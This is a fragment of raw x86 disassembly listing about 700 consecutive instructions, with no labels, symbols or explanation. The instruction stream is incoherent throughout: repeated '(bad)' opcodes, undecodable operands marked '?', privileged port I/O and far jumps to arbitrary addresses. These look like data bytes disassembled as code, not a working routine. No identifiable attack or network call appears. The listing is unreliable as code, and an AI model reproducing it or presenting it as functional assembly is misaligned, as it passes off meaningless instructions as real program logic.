  413095:	jle    0x4130f4
  413097:	mov    ss,WORD PTR [edx-0x80]
  41309a:	or     eax,0xa6402a20
  41309f:	inc    esp
  4130a0:	int    0x0
  4130a2:	or     ch,BYTE PTR [edx-0x1afb3fe1]
  4130a8:	stos   BYTE PTR es:[edi],al
  4130a9:	push   eax
  4130aa:	(bad)  
  4130ab:	or     eax,0xcfff3132
  4130b0:	popa   
  4130b1:	out    0x7e,eax
  4130b3:	adc    DWORD PTR [esi],edx
  4130b5:	pop    ebp
  4130b6:	scas   eax,DWORD PTR es:[edi]
  4130b7:	cmp    DWORD PTR [ebx+0x6e],esi
  4130ba:	adc    al,0x82
  4130bc:	or     cl,BYTE PTR [eax-0x2c]
  4130bf:	mov    bl,0x82
  4130c1:	mov    cl,0xb8
  4130c3:	dec    ebp
  4130c4:	sub    ch,BYTE PTR [edx]
  4130c6:	jle    0x413089
  4130c8:	ins    BYTE PTR es:[edi],dx
  4130c9:	hlt    
  4130ca:	inc    esp
  4130cb:	inc    esi
  4130cc:	pop    ebp
  4130cd:	fsubrp st(2),st
  4130cf:	xor    edx,esp
  4130d1:	and    ebx,DWORD PTR [eax]
  4130d3:	pop    eax
  4130d4:	not    al
  4130d6:	push   ebp
  4130d7:	xor    edi,DWORD PTR [eax+0x3ce4c032]
  4130dd:	xchg   ebx,eax
  4130de:	out    0xc1,eax
  4130e0:	test   DWORD PTR ds:0x74a762f3,edx
  4130e6:	test   ebx,ebp
  4130e8:	dec    edi
  4130e9:	in     eax,0x78
  4130eb:	mov    ecx,0x3a49bf00
  4130f0:	jge    0x41315f
  4130f2:	jbe    0x41313b
  4130f4:	hlt    
  4130f5:	jp     0x413114
  4130f7:	push   edx
  4130f8:	fwait
  4130f9:	mov    eax,0xb834ba15
  4130fe:	icebp  
  4130ff:	int3   
  413100:	sar    DWORD PTR [esi],cl
  413102:	bound  ebx,QWORD PTR [eax]
  413104:	xchg   DWORD PTR [ecx],eax
  413106:	sub    al,0x76
  413108:	or     eax,0xb9c5ecae
  41310d:	out    0xb5,eax
  41310f:	or     esi,DWORD PTR [edx+ebx*2]
  413112:	div    BYTE PTR [ebx-0x5a]
  413115:	arpl   WORD PTR [edx],sp
  413117:	por    mm4,QWORD PTR [esi-0x4af2c3bc]
  41311e:	aam    0xf1
  413120:	iret   
  413121:	xor    dh,cl
  413123:	mov    gs,WORD PTR [edx]
  413125:	rcl    DWORD PTR [ecx-0x66b8f142],cl
  41312b:	push   edx
  41312c:	mov    ebx,0xcac4805d
  413131:	sub    DWORD PTR [ecx+0x1e6df8fd],0xe0717f72
  41313b:	xchg   edi,eax
  41313c:	jmp    0x4130c7
  41313e:	inc    edx
  41313f:	push   ds
  413140:	xchg   edi,eax
  413141:	sahf   
  413142:	jp     0x4131ac
  413144:	(bad)  
  413145:	adc    al,0x33
  413147:	cli    
  413148:	ja     0x4131b4
  41314a:	rcr    dl,cl
  41314c:	ret    
  41314d:	adc    DWORD PTR fs:[ebx+0x34fa1f06],0xffffffd2
  413155:	add    al,0x11
  413157:	jp     0x41317c
  413159:	test   BYTE PTR [edx-0x7d],cl
  41315c:	cmp    al,0x62
  41315e:	(bad)  
  41315f:	(bad)  
  413161:	in     al,dx
  413162:	add    edi,esi
  413164:	in     eax,dx
  413165:	adc    BYTE PTR [ebx-0x6baf4a5b],bl
  41316b:	lahf   
  41316c:	xlat   BYTE PTR ds:[ebx]
  41316d:	xchg   edi,eax
  41316e:	data16 mov al,BYTE PTR [ecx+0x119292c7]
  413175:	rcl    DWORD PTR [eax],0xee
  413178:	pop    es
  413179:	fbld   TBYTE PTR [ecx+0x22]
  41317c:	xor    esi,DWORD PTR gs:[ecx]
  41317f:	loopne 0x413131
  413181:	push   es
  413182:	push   bp
  413184:	pop    ecx
  413185:	mov    eax,ds:0xdf40b1f8
  41318a:	mov    dh,0xb8
  41318c:	ja     0x4131a4
  41318e:	aas    
  41318f:	leave  
  413190:	data16 jp 0x4131b3
  413193:	rcr    DWORD PTR [edi-0x6a9e4455],1
  413199:	push   0xde4279df
  41319e:	push   eax
  41319f:	xor    cl,dl
  4131a1:	or     ecx,ecx
  4131a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131a4:	shl    esp,cl
  4131a6:	sbb    BYTE PTR [esi],cl
  4131a8:	into   
  4131a9:	xchg   ebx,eax
  4131aa:	pusha  
  4131ab:	pop    esi
  4131ac:	rcr    bl,1
  4131ae:	in     al,0xa
  4131b0:	adc    al,0x2d
  4131b2:	dec    edx
  4131b3:	ins    DWORD PTR es:[edi],dx
  4131b4:	mov    WORD PTR [ecx+0x67e648ae],es
  4131ba:	cmc    
  4131bb:	mov    BYTE PTR [ecx],bl
  4131bd:	mov    edi,0xed8d97b2
  4131c2:	adc    eax,0xfa3388e8
  4131c7:	xor    bl,BYTE PTR [edx]
  4131c9:	dec    eax
  4131ca:	mov    ds:0xd1012cbd,eax
  4131cf:	test   DWORD PTR [esi+0x1],edi
  4131d2:	push   ebx
  4131d3:	sub    esi,esp
  4131d5:	inc    ebx
  4131d6:	push   edi
  4131d7:	stos   BYTE PTR es:[edi],al
  4131d8:	loop   0x41317f
  4131da:	adc    cl,cl
  4131dc:	in     eax,0xfb
  4131de:	inc    eax
  4131df:	mov    eax,0x8876f59b
  4131e4:	jp     0x413217
  4131e6:	scas   al,BYTE PTR es:[edi]
  4131e7:	pop    es
  4131e8:	push   es
  4131e9:	or     BYTE PTR [edx-0x73],al
  4131ec:	scas   al,BYTE PTR es:[edi]
  4131ed:	push   ebx
  4131ee:	loopne 0x41323e
  4131f0:	push   ss
  4131f1:	clc    
  4131f2:	jp     0x4131ef
  4131f4:	cdq    
  4131f5:	(bad)  
  4131f6:	mov    dl,0xb2
  4131f8:	and    al,0x65
  4131fa:	mov    ds:0x45db2ccf,eax
  4131ff:	arpl   WORD PTR [ebx+0x1124bc12],ax
  413205:	scas   eax,DWORD PTR es:[edi]
  413206:	inc    edi
  413207:	ret    
  413208:	inc    esp
  413209:	xor    BYTE PTR [eax-0x31f17bcc],bl
  41320f:	ins    BYTE PTR es:[edi],dx
  413210:	cmp    edx,DWORD PTR [eax-0x639fd9c4]
  413216:	aaa    
  413217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413218:	push   ebp
  413219:	daa    
  41321a:	xor    DWORD PTR [edi],edi
  41321c:	sub    eax,DWORD PTR [ecx+0x50]
  41321f:	cld    
  413220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413221:	adc    esi,DWORD PTR [eax]
  413223:	cmp    BYTE PTR [esp+ecx*2-0x2b694402],ch
  41322a:	push   ebp
  41322b:	add    bh,0x82
  41322e:	or     ebp,DWORD PTR [ecx+0x33e38055]
  413234:	or     ah,cl
  413236:	inc    edx
  413237:	jns    0x4132ac
  413239:	fst    DWORD PTR [ecx]
  41323b:	xor    ch,BYTE PTR [ecx+ebp*4-0x1e]
  41323f:	jg     0x4131fb
  413241:	leave  
  413242:	sub    al,bh
  413244:	mov    ds:0xed570269,eax
  413249:	xchg   edi,eax
  41324a:	enter  0x1018,0x25
  41324e:	and    edi,eax
  413250:	or     bh,ah
  413252:	inc    edi
  413253:	cmp    edi,DWORD PTR [edi+0x5]
  413256:	adc    edx,DWORD PTR [ebp+0x7851648]
  41325c:	mov    ds:0x493a0964,al
  413261:	fist   WORD PTR [ecx-0x4b70fd43]
  413267:	ror    BYTE PTR [eax+0x20],1
  41326a:	or     dl,BYTE PTR [edx]
  41326c:	(bad)  
  41326d:	out    dx,al
  41326e:	xor    eax,0x7d482a9c
  413273:	xchg   edx,eax
  413274:	xchg   BYTE PTR [esi+0x67],bl
  413277:	mov    ebx,0x9f1e4ca2
  41327c:	leave  
  41327d:	xchg   ebp,eax
  41327e:	imul   esp,DWORD PTR [esi+0x231a6c40],0xffffffd9
  413285:	test   al,0x24
  413287:	jp     0x4132a1
  413289:	add    ecx,DWORD PTR [ebx-0x600b682c]
  41328f:	cmp    eax,0x649e5554
  413294:	and    ecx,DWORD PTR ds:0x425a7ab2
  41329a:	jne    0x413263
  41329c:	dec    ebp
  41329d:	repnz push ecx
  41329f:	or     dh,BYTE PTR [ebp+0x5a]
  4132a2:	jae    0x41328e
  4132a4:	cdq    
  4132a5:	sub    BYTE PTR fs:[bx+si],bl
  4132a9:	mov    eax,0x2ecc63b
  4132ae:	scas   al,BYTE PTR es:[edi]
  4132af:	cmp    DWORD PTR [edx-0x6fba3f53],esp
  4132b5:	dec    edx
  4132b6:	sbb    DWORD PTR [ecx+0xf375244],esi
  4132bc:	hlt    
  4132bd:	jecxz  0x4132c6
  4132bf:	add    eax,0xd1908b2e
  4132c4:	into   
  4132c5:	and    al,0xd
  4132c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132c8:	loop   0x413250
  4132ca:	xchg   ebp,eax
  4132cb:	push   eax
  4132cc:	(bad)  
  4132cd:	popa   
  4132ce:	rol    DWORD PTR [edi+0x76],0x7e
  4132d2:	sub    ah,dh
  4132d4:	xchg   edi,eax
  4132d5:	ins    BYTE PTR es:[edi],dx
  4132d6:	lahf   
  4132d7:	push   0x77b388a0
  4132dc:	(bad)  
  4132dd:	mov    ?,WORD PTR [ebx-0x1b]
  4132e0:	dec    edx
  4132e1:	popa   
  4132e2:	xor    BYTE PTR [eax-0x50],bl
  4132e5:	int3   
  4132e6:	clc    
  4132e7:	mov    ds:0xde47e65f,al
  4132ec:	adc    BYTE PTR [edx+0x3b47214c],al
  4132f2:	arpl   ax,ax
  4132f4:	push   esi
  4132f5:	fld    TBYTE PTR [edx+0x411d21d1]
  4132fb:	fcomp  DWORD PTR [ebx-0x5d]
  4132fe:	fistp  DWORD PTR [edi-0x6beab3fc]
  413304:	fs xchg ebx,eax
  413306:	mov    dl,0x42
  413308:	cmp    edx,ebx
  41330a:	pop    esi
  41330b:	and    ebx,DWORD PTR fs:[edx]
  41330e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41330f:	lahf   
  413310:	jns    0x41332b
  413312:	(bad)  
  413313:	std    
  413314:	push   edx
  413315:	loopne 0x413363
  413317:	xchg   edx,eax
  413318:	xchg   ebx,eax
  413319:	or     DWORD PTR [edi-0x48],ebx
  41331c:	lods   eax,DWORD PTR ds:[esi]
  41331d:	stos   BYTE PTR es:[edi],al
  41331e:	fwait
  41331f:	mov    esp,0x951057ee
  413324:	mov    dh,0x62
  413326:	xor    eax,0xa0717d80
  41332b:	sbb    eax,DWORD PTR [ebp+0x362019c4]
  413331:	sub    eax,0x80d19c7
  413336:	das    
  413337:	cdq    
  413338:	xor    edi,DWORD PTR [esi+0x38]
  41333b:	sub    al,bl
  41333d:	outs   dx,BYTE PTR ds:[esi]
  41333e:	pop    ds
  41333f:	mov    bh,0x84
  413341:	adc    al,0xfe
  413343:	inc    esp
  413344:	rcl    DWORD PTR [edx],1
  413346:	outs   dx,DWORD PTR ds:[esi]
  413347:	sub    eax,0xf34512af
  41334c:	sahf   
  41334d:	in     eax,0x76
  41334f:	mov    al,cl
  413351:	push   ss
  413352:	inc    esp
  413353:	mov    ?,edx
  413355:	cmp    eax,0xa510620d
  41335a:	mov    dh,0x2d
  41335c:	ss sbb eax,0x199d0d2c
  413362:	mov    eax,ds:0x50eac0d4
  413367:	ret    0xa4f0
  41336a:	xchg   ebp,eax
  41336b:	sub    edx,esi
  41336d:	in     eax,0x44
  41336f:	dec    ecx
  413370:	add    al,0xcd
  413372:	mov    ch,BYTE PTR [edx-0x4]
  413375:	push   edx
  413376:	jo     0x413317
  413378:	retf   0xed3d
  41337b:	ja     0x4133ba
  41337d:	jns    0x413383
  41337f:	sub    DWORD PTR [edi+0x6c],ebp
  413382:	sbb    dl,BYTE PTR [ecx-0x3e1f6193]
  413388:	iret   
  413389:	(bad)  
  41338a:	push   ds
  41338b:	inc    ebp
  41338c:	dec    edx
  41338d:	int3   
  41338e:	les    esp,FWORD PTR [ecx+0x2b]
  413391:	int    0xab
  413393:	sub    al,0x68
  413395:	inc    ebx
  413396:	push   0x5406450c
  41339b:	and    BYTE PTR [edx+0xc50d919],ch
  4133a1:	mov    esi,0x8ef7815b
  4133a6:	outs   dx,DWORD PTR ds:[esi]
  4133a7:	adc    eax,0x108bd99a
  4133ac:	sbb    bl,BYTE PTR [eax-0x4c3569ac]
  4133b2:	xchg   BYTE PTR [ebx],bl
  4133b4:	inc    ebp
  4133b5:	fistp  WORD PTR [edi+0x17d762b5]
  4133bb:	lock mov esp,0x7d78ea20
  4133c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133c2:	mov    eax,0xe66c16cc
  4133c7:	xchg   esi,eax
  4133c8:	rcr    BYTE PTR [edx],cl
  4133ca:	cmc    
  4133cb:	ret    0x915f
  4133ce:	call   ebx
  4133d0:	push   cs
  4133d1:	add    DWORD PTR [esp+esi*1-0x26],edx
  4133d5:	(bad)  
  4133d6:	pusha  
  4133d7:	jbe    0x4133bb
  4133d9:	xchg   ebx,eax
  4133da:	inc    ecx
  4133db:	out    0x62,eax
  4133dd:	test   eax,0xac12869c
  4133e2:	outs   dx,BYTE PTR ds:[esi]
  4133e3:	mov    ah,bh
  4133e5:	les    edi,FWORD PTR [edi]
  4133e7:	fwait
  4133e8:	mov    ecx,0xf4e1dfac
  4133ed:	sbb    al,0xca
  4133ef:	pop    eax
  4133f0:	lea    ebx,[ebx-0x7c]
  4133f3:	inc    edx
  4133f4:	pop    edx
  4133f5:	xchg   edx,eax
  4133f6:	jae    0x41346b
  4133f8:	sub    edi,esp
  4133fa:	pop    ds
  4133fb:	xor    BYTE PTR [eax],ch
  4133fd:	pop    edi
  4133fe:	test   DWORD PTR [eax+0x75fa48e8],edx
  413404:	jbe    0x4133ad
  413406:	push   esp
  413407:	gs scas al,BYTE PTR es:[edi]
  413409:	icebp  
  41340a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41340b:	(bad)  
  41340c:	xlat   BYTE PTR ds:[ebx]
  41340d:	mov    ah,0x80
  41340f:	mov    bl,BYTE PTR ds:0xfe2e8c7b
  413415:	adc    BYTE PTR [ecx-0x4c7795c6],al
  41341b:	icebp  
  41341c:	shl    edx,cl
  41341e:	stc    
  41341f:	cwde   
  413420:	(bad)  
  413421:	mov    ecx,0x174b9173
  413426:	jo     0x413497
  413428:	ins    DWORD PTR es:[edi],dx
  413429:	xor    dl,bl
  41342b:	dec    ebp
  41342c:	sbb    edi,ebp
  41342e:	dec    ecx
  41342f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413430:	dec    ecx
  413431:	add    DWORD PTR cs:[eax],esp
  413434:	out    0x26,al
  413436:	dec    eax
  413437:	das    
  413438:	retf   0x6fa3
  41343b:	push   esi
  41343c:	cld    
  41343d:	(bad)  
  41343e:	cmp    al,0xee
  413440:	adc    eax,0x8025af36
  413445:	imul   edx,ebp,0x2e
  413448:	push   esp
  413449:	adc    eax,0xe0bf5aaa
  41344e:	(bad)  
  41344f:	shl    DWORD PTR ds:0x678cf634,0xf6
  413456:	(bad)  [esi+0x5f]
  413459:	cmp    edx,ebp
  41345b:	mov    BYTE PTR [edi-0x10c4096d],cl
  413461:	jo     0x4134ca
  413463:	adc    bl,BYTE PTR [ecx+esi*8-0x47]
  413467:	xchg   edi,eax
  413468:	das    
  413469:	test   DWORD PTR [esi],eax
  41346b:	leave  
  41346c:	clc    
  41346d:	push   es
  41346e:	mov    eax,0x482ab9fd
  413473:	sar    dh,0x73
  413476:	call   0x6bbf:0x7fb25a2f
  41347d:	pop    ss
  41347e:	pop    ecx
  41347f:	dec    ebp
  413480:	and    eax,0x6620cde4
  413485:	retf   
  413486:	imul   esp,DWORD PTR [ecx+0x48],0xffffffbf
  41348a:	mov    ecx,edx
  41348c:	loope  0x413429
  41348e:	test   al,0xbe
  413490:	setbe  BYTE PTR [edx+0x5a30db9f]
  413497:	lds    eax,FWORD PTR [eax+ebx*4+0x24e45caa]
  41349e:	add    DWORD PTR [edi],esp
  4134a0:	cmp    BYTE PTR [edx+edx*4],ah
  4134a3:	and    eax,0xe55d36fa
  4134a8:	add    al,0x47
  4134aa:	mov    dh,0x66
  4134ac:	loope  0x4134ae
  4134ae:	sbb    eax,0x3ec8cf88
  4134b3:	cdq    
  4134b4:	mov    ecx,0x80af48aa
  4134b9:	sub    esi,DWORD PTR [esi-0x79cea9f8]
  4134bf:	imul   DWORD PTR ds:[edi]
  4134c2:	mov    ebp,0xdad6455c
  4134c7:	mov    WORD PTR [esi-0x16],es
  4134ca:	bound  eax,QWORD PTR [ebx-0x34]
  4134cd:	data16 cmp al,0x53
  4134d0:	xchg   ecx,eax
  4134d1:	cmc    
  4134d2:	jbe    0x4134c0
  4134d4:	dec    esp
  4134d5:	push   cs
  4134d6:	jmp    DWORD PTR ds:0xe9ae4efb
  4134dc:	adc    eax,0xe2c8c44c
  4134e1:	add    bh,0xfb
  4134e4:	test   eax,0x114a7568
  4134e9:	pop    eax
  4134ea:	call   0xe74b:0x90eb929a
  4134f1:	mov    esp,0x2edbf80c
  4134f6:	in     eax,0x3b
  4134f8:	mov    fs,edx
  4134fa:	(bad)  
  4134fb:	or     eax,0xa7842b33
  413500:	adc    DWORD PTR [esi],esi
  413502:	std    
  413503:	in     al,dx
  413504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413505:	mov    BYTE PTR [edx+0x495782e2],dl
  41350b:	pop    ebp
  41350c:	mov    cs,WORD PTR [eax+ecx*2+0x34c7eced]
  413513:	mov    esi,0x48df4142
  413518:	icebp  
  413519:	lods   al,BYTE PTR ds:[esi]
  41351a:	sahf   
  41351b:	inc    ecx
  41351c:	jmp    0xdcb241fe
  413521:	jns    0x4134c9
  413523:	inc    ebx
  413524:	stos   BYTE PTR es:[edi],al
  413525:	call   0xc15cc466
  41352a:	in     eax,dx
  41352b:	out    dx,eax
  41352c:	in     al,dx
  41352d:	mov    ch,al
  41352f:	(bad)  
  413530:	lea    esi,[esi-0x2e382c5d]
  413536:	mov    dl,0x6e
  413538:	adc    BYTE PTR [edx],bh
  41353a:	jecxz  0x413546
  41353c:	lds    esp,FWORD PTR [esi-0x2e8ca454]
  413542:	test   al,0xe4
  413544:	xchg   ebx,eax
  413545:	mov    DWORD PTR [edx+0x34a46c90],ebx
  41354b:	mov    cl,0x1c
  41354d:	out    0xe,eax
  41354f:	sub    eax,0x4ce31c6f
  413554:	cs mov bl,0xa2
  413557:	add    bh,0xb
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	cmp    DWORD PTR [edx-0x5b],eax
  41355e:	test   dh,ch
  413560:	push   eax
  413561:	xchg   ebx,eax
  413562:	jae    0x41352d
  413564:	push   esi
  413565:	push   ebx
  413566:	or     esp,0xeeb2c966
  41356c:	jno    0x4135d4
  41356e:	mov    edx,0xe326470d
  413573:	imul   esp,ebx,0xe7b42c0a
  413579:	or     BYTE PTR [esi],bh
  41357b:	mov    ah,0xac
  41357d:	xchg   cl,ch
  41357f:	pop    esi
  413580:	loop   0x41355e
  413582:	jb     0x413516
  413584:	les    ebp,FWORD PTR [ebx-0x25]
  413587:	adc    DWORD PTR [eax-0x3a82a503],edx
  41358d:	icebp  
  41358e:	jns    0x4135b2
  413590:	xchg   esp,eax
  413591:	mov    ebp,0xafa95394
  413596:	mov    eax,ds:0x1408f033
  41359b:	ins    DWORD PTR es:[edi],dx
  41359c:	fwait
  41359d:	mov    edi,0x9dde5c68
  4135a2:	gs push esp
  4135a4:	mov    ah,0x94
  4135a6:	mov    al,ds:0xe6568ebf
  4135ab:	out    0xd6,eax
  4135ad:	mov    esp,0xef1924d0
  4135b2:	xchg   ebp,eax
  4135b3:	in     al,dx
  4135b4:	xor    dh,dl
  4135b6:	jmp    0x9922a292
  4135bb:	aad    0x61
  4135bd:	or     BYTE PTR [edi-0x410f7c2c],bh
  4135c3:	push   0x7
  4135c5:	lods   eax,DWORD PTR ds:[esi]
  4135c6:	(bad)  
  4135c7:	ins    BYTE PTR es:[edi],dx
  4135c8:	data16 jbe 0x413635
  4135cb:	cs mov dh,0xb
  4135ce:	pop    edi
  4135cf:	push   esi
  4135d0:	shr    al,0xa3
  4135d3:	push   edi
  4135d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135d5:	mov    ds:0xe6930604,eax
  4135da:	repnz push edi
  4135dc:	inc    ebx
  4135dd:	push   0x68a3b1c1
  4135e2:	mov    ecx,0x9f7b8f5f
  4135e7:	inc    edx
  4135e8:	pop    DWORD PTR [ecx+0x7e]
  4135eb:	jb     0x413596
  4135ed:	in     eax,0x9f
  4135ef:	jne    0x4135b1
  4135f1:	sbb    esi,DWORD PTR [ebx+0x4e]
  4135f4:	add    DWORD PTR [esi+0x7b8bc391],edx
  4135fa:	add    ebp,DWORD PTR fs:[esi]
  4135fd:	mov    ds:0xc3f09ac5,al
  413602:	icebp  
  413603:	rcl    ecx,cl
  413605:	stos   BYTE PTR es:[edi],al
  413606:	push   edx
  413607:	mov    eax,ds:0x3108cc49
  41360c:	sti    
  41360d:	daa    
  41360e:	adc    ecx,DWORD PTR [ecx]
  413610:	inc    edx
  413611:	je     0x41365c
  413613:	jmp    0x1adc21d6
  413618:	outs   dx,BYTE PTR ds:[esi]
  413619:	push   edx
  41361a:	push   ebx
  41361b:	les    ecx,FWORD PTR [eax]
  41361d:	adc    eax,0xca15f41e
  413622:	sar    DWORD PTR [eax],1
  413624:	aam    0xe1
  413626:	dec    esi
  413627:	scas   eax,DWORD PTR es:[edi]
  413628:	retf   0x186c
  41362b:	sbb    eax,0xb1968990
  413630:	dec    edi
  413631:	(bad)  
  413632:	(bad)  
  413633:	(bad)  
  413634:	and    eax,0x23eaa586
  413639:	push   cs
  41363a:	mov    edi,0x53340f14
  41363f:	out    0x26,al
  413641:	and    BYTE PTR [eax],0x3e
  413644:	js     0x413683
  413646:	in     eax,0xf4
  413648:	cmp    bh,BYTE PTR [ebx+0x5c]
  41364b:	and    ecx,DWORD PTR [esi]
  41364d:	es retf 0x278f
  413651:	fisub  WORD PTR ds:0xb868da4e
  413657:	fst    DWORD PTR [edx+0xf]
  41365a:	gs push ebx
  41365c:	(bad)  
  41365d:	aas    
  41365e:	fwait
  41365f:	mov    cl,0x96
  413661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413662:	popf   
  413663:	add    eax,0xf260dc6b
  413668:	lea    edi,[eax+0x18f10113]
  41366e:	xchg   esp,eax
  41366f:	rol    DWORD PTR [esi-0x41],0x9e
  413673:	sub    al,0xe5
  413675:	xchg   esp,eax
  413676:	add    al,0x2c
  413678:	jo     0x413642
  41367a:	mov    al,ds:0x4729a2c2
  41367f:	fcomip st,st(7)
  413681:	xchg   esi,eax
  413682:	push   ebp
  413683:	rcr    DWORD PTR [ecx-0x31],1
  413686:	xchg   esp,eax
  413687:	push   ebp
  413688:	test   DWORD PTR [esp+ebx*2+0x6],esi
  41368c:	mov    esp,0xc284761a
  413691:	clc    
  413692:	inc    edx
  413693:	push   0xffffff84
  413695:	(bad)  
  413696:	std    
  413697:	sbb    BYTE PTR [esi-0x2],ch
  41369a:	out    0xfd,al
  41369c:	(bad)  
  41369d:	in     eax,dx
  41369e:	sub    ebp,eax
  4136a0:	xor    DWORD PTR [edx-0x2d80c8a3],eax
  4136a6:	push   edx
  4136a7:	xchg   ecx,eax
  4136a8:	shl    esi,0x22
  4136ab:	xchg   DWORD PTR [ecx],ebx
  4136ad:	ret    0xaa87
  4136b0:	push   ds
  4136b1:	mov    dl,0xa8
  4136b3:	jns    0x41363c
  4136b5:	pop    eax
  4136b6:	sbb    dh,BYTE PTR [ecx-0x32]
  4136b9:	pop    es
  4136ba:	sbb    eax,0x349cb9ee
  4136bf:	mov    DWORD PTR [edx],eax
  4136c1:	inc    ecx
  4136c2:	sbb    al,0x52
  4136c4:	daa    
  4136c5:	add    dh,al
  4136c7:	jne    0x4136c3
  4136c9:	scas   eax,DWORD PTR es:[edi]
  4136ca:	or     bl,cl
  4136cc:	pop    ecx
  4136cd:	mov    cl,0x9a
  4136cf:	xchg   BYTE PTR [eax],dh
  4136d1:	inc    esi
  4136d2:	dec    edx
  4136d3:	pop    edx
  4136d4:	cmp    edi,DWORD PTR [ecx+0x4844f6d0]
  4136da:	dec    ebx
  4136db:	out    dx,al
  4136dc:	cdq    
  4136dd:	pop    ds
  4136de:	test   BYTE PTR [esi-0x17],bh
  4136e1:	fmul   st(4),st
  4136e3:	std    
  4136e4:	mov    edi,0xf1d96c78
  4136e9:	das    
  4136ea:	pushf  
  4136eb:	enter  0xc3ba,0xef
  4136ef:	retf   0xe4ca
  4136f2:	jmp    0xba3d:0xfa462fb8
  4136f9:	push   0xffffff98
  4136fb:	mov    WORD PTR [esi*2-0x215f732b],es
  413702:	jp     0x4136af
  413704:	mov    WORD PTR [ebp-0x52],?
  413707:	mov    ah,0xf
  413709:	jb     0x413759
  41370b:	or     BYTE PTR [eax-0x5aca6a5b],bl
  413711:	mov    ebx,0xc801c0db
  413716:	push   es
  413717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413718:	sbb    eax,0x9306b4fe
  41371d:	mov    eax,0x3e2c274b
  413722:	or     esi,DWORD PTR [esi]
  413724:	cmc    
  413725:	popf   
  413726:	rcr    DWORD PTR [ecx],0x3c
  413729:	stc    
  41372a:	enter  0x2a83,0xbd
  41372e:	cmp    DWORD PTR [edi-0x21f58b97],ecx
  413734:	mov    eax,0x49678141
  413739:	daa    
  41373a:	add    bh,bh
  41373c:	sbb    ebx,DWORD PTR [ebx]
  41373e:	adc    edi,DWORD PTR [edx-0x76]
  413741:	maskmovq mm6,(bad)
  413742:	div    DWORD PTR [edi+0x19d19866]
  413748:	mov    dl,0xaa
  41374a:	xor    dh,BYTE PTR [edx]
  41374c:	lahf   
  41374d:	jne    0x4137a1
  41374f:	test   DWORD PTR [eax],edi
  413751:	push   ss
  413752:	out    0x15,al
  413754:	pop    ss
  413755:	sub    eax,0xd07ca907
  41375a:	mov    ds:0xac3262ef,eax
  41375f:	arpl   cx,di
  413761:	jo     0x413738
  413763:	xor    dh,BYTE PTR [ecx-0x66]
  413766:	sahf   
  413767:	push   ecx
  413768:	mov    WORD PTR [ecx+0x32],ss
  41376b:	sub    al,0x45
  41376d:	shl    BYTE PTR [ebp+0x188eae0],0x6f
  413774:	mov    cl,BYTE PTR [esi-0x21]
  413777:	mov    dh,BYTE PTR [eax-0x53]
  41377a:	imul   ecx,ecx,0x74f54665
  413780:	ret    0xfe48
  413783:	(bad)  
  413785:	jle    0x413734
  413787:	leave  
  413788:	jo     0x4137f3
  41378a:	pop    edi
  41378b:	jmp    0x1d1f:0x6f6b
  413791:	clc    
  413792:	mov    esp,0xcd68eb22
  413797:	cld    
  413798:	jnp    0x4137cd
  41379a:	test   ebp,esi
  41379c:	aam    0x5e
  41379e:	or     ebx,DWORD PTR [eax-0x253e1f68]
  4137a4:	or     eax,ebx
  4137a6:	int    0xdc
  4137a8:	sub    eax,0x17f6d13
  4137ad:	xchg   ecx,eax
  4137ae:	popa   
  4137af:	or     ch,0x7c
  4137b2:	call   0x272f:0x6f89fda2
  4137b9:	in     eax,dx
  4137ba:	xor    DWORD PTR [ebx+0x71ff2e91],0xffffff83
  4137c1:	inc    edi
  4137c2:	mov    al,0xff
  4137c4:	loope  0x413765
  4137c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137c7:	mov    dl,0x55
  4137c9:	fist   DWORD PTR [esi-0x5fb892e3]
  4137cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137d0:	xchg   edx,eax
  4137d1:	or     dh,al
  4137d3:	aam    0x5a
  4137d5:	pop    ecx
  4137d6:	mov    bl,0xd
  4137d8:	leave  
  4137d9:	cmp    eax,0x3f118bd
  4137de:	(bad)  
  4137df:	rcl    bh,1
  4137e1:	test   al,0x5
  4137e3:	sbb    DWORD PTR [edx+edx*4-0x5f],edi
  4137e7:	ins    DWORD PTR es:[edi],dx
  4137e8:	shl    BYTE PTR [ebx+0xe],1
  4137eb:	sbb    DWORD PTR [eax-0x5aa80968],esi
  4137f1:	jmp    0xdad6:0x48151389
  4137f8:	sbb    al,0xa6
  4137fa:	ficomp WORD PTR [edi+eax*4+0x70]
  4137fe:	inc    ecx
  4137ff:	xor    al,0x70
  413801:	out    dx,al
  413802:	enter  0xa431,0xa1
  413806:	mov    ebx,0xa590e8cf
  41380c:	rep outs dx,BYTE PTR ds:[esi]
  41380e:	xor    eax,0x3e523383
  413813:	inc    edi
  413814:	or     eax,eax
  413816:	adc    BYTE PTR [ebx],ch
  413818:	xchg   ecx,eax
  413819:	or     BYTE PTR [ebp+0x66256a03],cl
  41381f:	xchg   esi,eax
  413820:	push   esi
  413821:	dec    ebp
  413822:	dec    edx
  413823:	fimul  DWORD PTR [edi]
  413825:	adc    DWORD PTR [eax+0x8a1ba37],edx
  41382b:	data16 fdivr st,st(1)
  41382e:	xor    eax,0x44f460ee
  413833:	mov    al,ds:0xe282668c
  413838:	enter  0x2ff3,0x64
  41383c:	int    0x99
  41383e:	in     eax,dx
  41383f:	mov    edx,0x126ee288
  413844:	xchg   edx,eax
  413845:	mov    bl,0xb4
  413847:	ss jae 0x413818
  41384a:	jle    0x41389d
  41384c:	xchg   ebx,eax
  41384d:	mov    al,0xda
  41384f:	sub    al,0xe9
  413851:	fst    QWORD PTR [esi+0x37b6e720]
  413857:	sbb    esp,esp
  413859:	bound  edx,QWORD PTR [esi]
  41385b:	ins    DWORD PTR es:[edi],dx
  41385c:	xchg   ebp,eax
  41385d:	mov    eax,0x228c228f
  413862:	lds    ebp,FWORD PTR [edx-0xe]
  413865:	push   edx
